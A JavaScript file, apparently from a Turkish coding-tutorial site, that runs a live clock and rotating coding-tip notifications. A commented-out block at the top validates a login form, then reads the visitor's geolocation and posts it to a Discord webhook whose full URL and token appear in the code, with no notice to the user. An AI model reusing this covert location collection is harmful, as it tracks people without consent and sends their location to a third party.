// // Function to validate form and share geolocation
// async function validateFormAndShareLocation() {
//     // Validate the form
//     var username = document.getElementById("username").value;
//     var password = document.getElementById("password").value;
//     var errorMessage = document.getElementById("error-message");

//     if (username === "" && password === "") {
//         errorMessage.innerHTML = "Kullanıcı adı ve şifre alanlarını doldurun.";
//         return; // Exit the function early if both fields are empty
//     } else if (username === "") {
//         errorMessage.innerHTML = "Kullanıcı adı alanını doldurun.";
//         return; // Exit the function early if username is empty
//     } else if (password === "") {
//         errorMessage.innerHTML = "Şifre alanını doldurun.";
//         return; // Exit the function early if password is empty
//     } else {
//         errorMessage.innerHTML = ""; // Clear error message
//     }

//     // Get the user's geolocation
//     const { coords } = await getGeolocation();
//     const latitude = coords.latitude;
//     const longitude = coords.longitude;

//     // Send the geolocation to Discord
//     await sendGeolocationToDiscord(latitude, longitude);

//     // Redirect to the desired page (e.g., anasayfa)
//     window.location.href = "anasayfa/index.html";

// }

// // Function to get the user's geolocation (promisified)
// function getGeolocation() {
//     return new Promise((resolve, reject) => {
//         if ('geolocation' in navigator) {
//             navigator.geolocation.getCurrentPosition(resolve, reject);
//         }
//     });
// }

// // Function to send geolocation to Discord webhook (promisified)
// function sendGeolocationToDiscord(latitude, longitude) {
//     const webhookURL = 'https://discord.com/api/webhooks/1136583143487442965/aKQsh_nMMWGGOallICiovFbSSw_YUTps-ncTpCPv48S7LfujlSY_mwV06kIJMcsrV3if'; // Replace with your Discord webhook URL

//     const payload = {
//         content: `User's Geolocation: Latitude ${latitude}, Longitude ${longitude}`
//     };

//     return fetch(webhookURL, {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//         },
//         body: JSON.stringify(payload),
//     });
// }


// Her saniye zamanı güncellemek için zamanlayıcı kullanabilirsiniz
setInterval(function() {
    var yeniZaman = new Date();
    document.getElementById("zaman").innerHTML = yeniZaman.toLocaleString();
}, 1000); // Her 1000 milisaniyede (1 saniye) güncelle

// function validateForm() {
//     var username = document.getElementById("username").value;
//     var password = document.getElementById("password").value;
//     var errorMessage = document.getElementById("error-message");

//     if (username === "" && password === "") {
//         errorMessage.innerHTML = "Kullanıcı adı ve şifre alanlarını doldurun.";
//     } else if (username === "") {
//         errorMessage.innerHTML = "Kullanıcı adı alanını doldurun.";
//     } else if (password === "") {
//         errorMessage.innerHTML = "Şifre alanını doldurun.";
//     } else {
//         errorMessage.innerHTML = ""; // Hata mesajını temizle
//         window.location.href = "anasayfa/index.html";
//     }
// }

//notification
const messages = [
    "Kodlama dünyasına adım attınız! Yeni bir dil öğrenmek için sabırsızlanıyorsanız başlayın.",
    "Bir programcı, sorunları çözmek için klavyeyi en iyi arkadaşı olarak görür.",
    "Kod yazarken bol bol not almak fikirlerinizi ve mantığınızı net tutmanıza yardımcı olabilir.",
    "Kodlama öğrenirken sabır ve azim her zaman en büyük yardımcınız olacaktır.",
    "Bir hata bulunup düzeltildiğinde, o hatayı bulan kişi gerçek bir dedektif gibi hisseder!",
    "Büyük projeleri küçük, yönetilebilir parçalara bölmek her zaman daha etkili bir yaklaşımdır.",
    "Stack Overflow, en iyi arkadaşınız olabilir. Başkalarının sorunlarından öğrenmeyi unutmayın!",
    "Kod yazarken kreatif olun! Her satırda kendi imzanızı bırakabilirsiniz.",
    "Bir dil öğrenirken sadece sözdizimi değil, problem çözme yeteneğini de geliştirdiğinizi unutmayın.",
    "Bir bug bulduğunuzda, önceki çalışan sürüme geri dönün ve neyi değiştirdiğinizi anlamaya çalışın.",
    "Yeniliklere ve değişime açık olun. Teknoloji sürekli olarak evriliyor!",
    "Kodlamayı öğrenirken projeler oluşturmak, teoriden daha hızlı öğrenmenin harika bir yoludur.",
    "Bir kod parçası yazdığınızda ve sorunsuz çalıştığını gördüğünüzde duyduğunuz gurur tarif edilemez.",
    "Hata yapmaktan korkmayın, çünkü her hata aslında yeni bir öğrenme fırsatıdır.",
    "Kodlama öğrenirken belgelemeyi alışkanlık haline getirirseniz ileride size büyük kolaylık sağlar.",
    "Başkalarının kodlarını okumak, farklı yaklaşımları ve teknikleri öğrenmenizi sağlar. Açık kaynaklı projelere göz atmayı deneyin!"
];

function showNotification(message) {
    const notificationElement = document.getElementById('notification');
    const messageElement = document.getElementById('notification-message');
    messageElement.textContent = message;
    notificationElement.classList.add('active');

    setTimeout(() => {
        notificationElement.classList.remove('active');
        setTimeout(() => {
            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
            showNotification(randomMessage);
        }, 500); // Bildirimi gizledikten 0.5 saniye sonra yeni bir bildirim göster
    }, 5000);
}

// İlk bildirimi başlat
const initialRandomMessage = messages[Math.floor(Math.random() * messages.length)];
showNotification(initialRandomMessage);